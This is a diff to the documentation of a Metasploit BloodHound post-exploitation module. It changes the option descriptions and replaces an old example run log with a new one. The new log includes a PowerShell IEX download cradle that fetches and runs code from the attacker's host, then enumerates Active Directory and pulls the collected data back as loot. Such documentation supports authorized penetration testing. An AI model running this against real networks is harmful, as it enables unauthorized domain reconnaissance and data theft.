@@ -29,7 +29,7 @@ Which method to use to get shaphound running.  Default is `download`.
 
 ### CollectionMethode
 
-The collection method to use. This parameter accepts a comma separated list of values. Accepted values are `Default`, `Group`,
+The collection method to use. Accepted values are `Default`, `Group`,
 `LocalAdmin`, `RDP`, `DCOM`, `GPOLocalGroup`, `Session`, `ObjectProps`, `ComputerOnly`, `LoggedOn`, `Trusts`, `ACL`, `Container`,
 `DcOnly`, `All`.  The default method is `Default`.
 
@@ -61,10 +61,6 @@ Uses LDAPs instead of unencrypted LDAP on port 636. The default value is `false`
 
 Disables Kerberos Signing on requests. The default value is `false`.
 
-### SkipPing
-
-Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of
-being up Use this option if ping is disabled on the network for some reason. The default value is `false`.
 
 ### OutputFolder
 
@@ -80,22 +76,41 @@ If the cache file (.bin) should NOT be written to disk.  Default is `true`.
 
 ## Scenarios
 
-```
-meterpreter > run post/windows/gather/bloodhound
+### Windows 2012 Domain Controller, Download method
 
-[*] Using URL: http://0.0.0.0:8080/bvqUdtHUQ4De1O3
-[*] Local IP: http://192.168.1.136:8080/bvqUdtHUQ4De1O3
-[*] Invoking BloodHound with: Invoke-BloodHound -CollectionMethod Default -Threads 10 -JSONFolder "C:\Windows\TEMP" -PingTimeout 250 -LoopDelay 300 
-[*] Initializing BloodHound at 6:44 AM on 4/29/2019
-[*] Resolved Collection Methods to Group, LocalAdmin, Session, Trusts
-[*] Starting Enumeration for uplift.local
-[*] Status: 58 objects enumerated (+58 �/s --- Using 58 MB RAM )
-[*] Finished enumeration for uplift.local in 00:00:00.6365050
-[*] 0 hosts failed ping. 0 hosts timedout.
-[*] 
-[*] Compressing data to C:\Windows\TEMP\20190429064444_BloodHound.zip.
-[*] You can upload this file directly to the UI.
-[*] Finished compressing files!
+```
+msf6 post(windows/gather/bloodhound) > run
+
+[*] Using URL: http://1.1.1.1:8080/127mPhBr3dZ
+[*] Loading BloodHound with: IEX (new-object net.webclient).downloadstring('http://1.1.1.1:8080/127mPhBr3dZ')
+[*] Invoking BloodHound with: Invoke-BloodHound -OutputDirectory "C:\Users\ADMINI~1\AppData\Local\Temp" -ZipFileName isid -MemCache -ZipPassword ilvtbfgkcmwszdxjn 
+[*] 2022-11-13T13:45:21.0298446-05:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
+[*] 2022-11-13T13:45:21.4198615-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+[*] 2022-11-13T13:45:21.4666492-05:00|INFORMATION|Initializing SharpHound at 1:45 PM on 11/13/2022
+[*] 2022-11-13T13:45:22.2154647-05:00|INFORMATION|Loaded cache with stats: 59 ID to type mappings.
+[*]  59 name to SID mappings.
+[*]  0 machine sid mappings.
+[*]  2 sid to domain mappings.
+[*]  0 global catalog mappings.
+[*] 2022-11-13T13:45:22.2310827-05:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+[*] 2022-11-13T13:45:22.6054639-05:00|INFORMATION|Beginning LDAP search for hoodiecola.com
+[*] 2022-11-13T13:45:22.7458626-05:00|INFORMATION|Producer has finished, closing LDAP channel
+[*] 2022-11-13T13:45:22.7614632-05:00|INFORMATION|LDAP channel closed, waiting for consumers
+[*] 2022-11-13T13:45:53.5431310-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 87 MB RAM
+[*] 2022-11-13T13:46:06.1354911-05:00|INFORMATION|Consumers finished, closing output channel
+[*] 2022-11-13T13:46:06.2134955-05:00|INFORMATION|Output channel closed, waiting for output task to complete
+[*] Closing writers
+[*] 2022-11-13T13:46:06.5255088-05:00|INFORMATION|Status: 100 objects finished (+100 2.325581)/s -- Using 89 MB RAM
+[*] 2022-11-13T13:46:06.5255088-05:00|INFORMATION|Enumeration finished in 00:00:43.9260652
+[*] 2022-11-13T13:46:06.7283096-05:00|INFORMATION|Saving cache with stats: 59 ID to type mappings.
+[*]  59 name to SID mappings.
+[*]  0 machine sid mappings.
+[*]  2 sid to domain mappings.
+[*]  0 global catalog mappings.
+[*] 2022-11-13T13:46:06.7439000-05:00|INFORMATION|SharpHound Enumeration Completed at 1:46 PM on 11/13/2022! Happy Graphing!
+[+] Downloaded C:\Users\ADMINI~1\AppData\Local\Temp\20221113134605_isid.zip: /root/.msf4/loot/20221113141655_default_2.2.2.2_windows.ad.blood_027677.zip
+[+] Zip password: ilvtbfgkcmwszdxjn
+[*] Post module execution completed
 ```
 
 ### Windows 10 non-AD host, Windows Server 2012 AD, Disk Method
